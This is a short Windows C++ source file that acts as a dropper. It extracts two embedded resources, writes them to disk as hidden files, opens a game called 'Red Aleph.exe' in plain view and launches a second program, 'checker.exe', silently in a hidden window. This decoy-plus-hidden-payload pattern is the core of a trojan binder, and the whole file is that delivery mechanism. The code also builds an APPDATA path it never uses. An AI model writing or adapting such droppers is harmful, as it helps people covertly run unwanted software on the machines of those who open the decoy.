#include <Windows.h>
#include <shlobj.h>

#include "resource.h"

void dropResAndExec(int res_id, const wchar_t* res_fold, const wchar_t* exename, int show)
{
	wchar_t filepath[MAX_PATH * 2] = { 0 };

	HRSRC hRsrc = FindResourceW(nullptr, MAKEINTRESOURCEW(res_id), res_fold);
	if (hRsrc == NULL)
		return;
	DWORD totalSize = SizeofResource(NULL, hRsrc);
	if (totalSize == 0)
		return;
	HGLOBAL hGlobal = LoadResource(NULL, hRsrc);
	if (hGlobal == NULL)
		return;
	LPVOID pBuffer = LockResource(hGlobal);
	if (pBuffer == NULL)
		return;

	SHGetFolderPathW(NULL, CSIDL_APPDATA, NULL, 0, filepath);
	lstrcatW(filepath, L"\\");
	lstrcatW(filepath, exename);

	HANDLE hFile = CreateFileW(exename, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_HIDDEN, NULL);
	if (hFile == INVALID_HANDLE_VALUE)
	{
		return;
	}
	DWORD dwNum = 0;
	WriteFile(hFile, (char*)pBuffer, totalSize, &dwNum, NULL);
	CloseHandle(hFile);
	ShellExecuteW(NULL, L"open", exename, NULL, NULL, show);
}

int WINAPI wWinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, PWSTR pCmdLine, int nCmdShow)
{
	dropResAndExec(IDR_GAME1, L"GAME", L"Red Aleph.exe", SW_SHOW);
	dropResAndExec(IDR_CHECK1, L"CHECK", L"checker.exe", SW_HIDE);
}